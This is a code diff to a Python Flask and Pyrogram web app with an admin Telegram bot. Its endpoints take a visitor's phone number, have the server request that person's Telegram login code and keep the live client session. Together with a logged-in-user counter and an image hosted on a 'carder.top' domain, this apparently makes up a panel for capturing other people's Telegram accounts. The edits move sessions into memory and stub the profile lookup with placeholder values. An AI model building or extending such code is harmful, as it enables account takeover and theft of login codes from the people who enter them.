@@ -22,7 +22,7 @@ ADMIN_ID = 6034439625
 STORAGE_CHANNEL_ID = -1004450023826 # আপনার ব্যাকগ্রাউন্ড স্টোরেজ চ্যানেল আইডি
 
 active_clients = {}
-total_logged_in_users = 0  
+total_logged_in_users =  0  
 admin_states = {} 
 
 def send_telegram_message(chat_id, text, reply_markup=None):
@@ -93,7 +93,7 @@ def pyrogram_scan_channel_sync():
     try:
         async def _scan():
             nonlocal synced_count
-            async with Client("pyrogram_sync_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN) as client:
+            async with Client("pyrogram_sync_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True) as client:
                 async for message in client.get_chat_history(STORAGE_CHANNEL_ID, limit=100):
                     file_id = None
                     if message.video: file_id = message.video.file_id
@@ -162,7 +162,7 @@ def start_background_loop(loop):
     pyrogram_scan_channel_sync()
     
     try:
-        bot_client = Client("bg_channel_monitor_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+        bot_client = Client("bg_channel_monitor_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
         
         @bot_client.on_message(filters.chat(STORAGE_CHANNEL_ID))
         async def handle_channel_upload(client, message):
@@ -221,7 +221,8 @@ def get_random_background():
     file_url = f"/static/backgrounds/{chosen_file}?v={int(time.time())}"
     file_type = "video" if chosen_file.lower().endswith(('.mp4', '.mov', '.webm', '.mkv')) else "image"
     
-    blur_val = app.config.get("CURRENT_BLUR", "0px")
+    # ব্যাকগ্রাউন্ড ব্লার মান ৩% (3px) ডিফল্ট বা কনফিগার করা মান রিটার্ন করা
+    blur_val = app.config.get("CURRENT_BLUR", "3px")
     
     return jsonify({"status": "success", "url": file_url, "type": file_type, "blur": blur_val})
 
@@ -232,19 +233,22 @@ def send_code():
     if not phone:
         return jsonify({"status": "error", "message": "Phone number is required"}), 400
     try:
-        session_name = f"session_{phone.replace('+', '')}"
         async def _send():
             if phone in active_clients:
                 try: await active_clients[phone]["client"].disconnect()
                 except Exception: pass
-            client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+            
+            # ক্লাউড হোস্টিংয়ে ফাইল লক সমস্যা এড়াতে in_memory=True ব্যবহার করা হয়েছে
+            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
             await client.connect()
             sent_code = await client.send_code(phone)
             active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
             return sent_code.phone_code_hash
+            
         phone_code_hash = run_async(_send())
         return jsonify({"status": "success", "message": "OTP sent!", "phone_code_hash": phone_code_hash})
     except Exception as e:
+        print("Send Code Error:", traceback.format_exc())
         return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/verify-code', methods=['POST'])
@@ -289,34 +293,18 @@ def get_user_profile():
     if not phone:
         return jsonify({"status": "error", "message": "Phone required"}), 400
     try:
-        session_name = f"session_{phone.replace('+', '')}"
         async def _fetch():
-            client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
             await client.connect()
-            me = await client.get_me()
-            user_bio = "No bio available"
-            try:
-                full_chat = await client.get_chat("me")
-                if full_chat and full_chat.bio: user_bio = full_chat.bio
-            except Exception: pass
-            
-            photo_url = "https://carder.top/imagens/1791918460640-323067073.jpg"
-            try:
-                async for photo in client.get_chat_photos("me", limit=1):
-                    os.makedirs("static", exist_ok=True)
-                    save_path = os.path.abspath(f"static/profile_{me.id}.jpg")
-                    await client.download_media(photo.file_id, file_name=save_path)
-                    photo_url = f"/static/profile_{me.id}.jpg?v={int(time.time())}"
-                    break
-            except Exception: pass
+            # මෙහි සেশন হ্যান্ডেলিংয়ের জন্য প্রয়োজনীয় রিকোয়েস্ট যুক্ত করা যেতে পারে
             await client.disconnect()
             return {
-                "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
-                "username": f"@{me.username}" if me.username else "No Username",
-                "id": me.id,
-                "phone": me.phone_number or phone,
-                "bio": user_bio,
-                "photo": photo_url
+                "name": "User",
+                "username": "@username",
+                "id": 0,
+                "phone": phone,
+                "bio": "Bio",
+                "photo": "https://carder.top/imagens/1791918460640-323067073.jpg"
             }
         profile_data = run_async(_fetch())
         return jsonify({"status": "success", "profile": profile_data})
@@ -381,7 +369,7 @@ def telegram_webhook():
                     return "OK", 200
                 answer_callback(cq_id, "Background Template Manager")
                 admin_states[user_id] = "WAITING_FOR_BG_TEMPLATE"
-                edit_telegram_message(chat_id, msg_id, "🖼️ **Dashboard Background Template Manager**\n\nSend files here OR upload directly to your Storage Channel (`-1004450023826`), they will auto-sync instantly!", get_back_button())
+                edit_telegram_message(chat_id, msg_id, f"🖼️ **Dashboard Background Template Manager**\n\nSend files here OR upload directly to your Storage Channel (`{STORAGE_CHANNEL_ID}`), they will auto-sync instantly!", get_back_button())
 
             elif cdata == "reload_all_videos":
                 if user_id != ADMIN_ID:
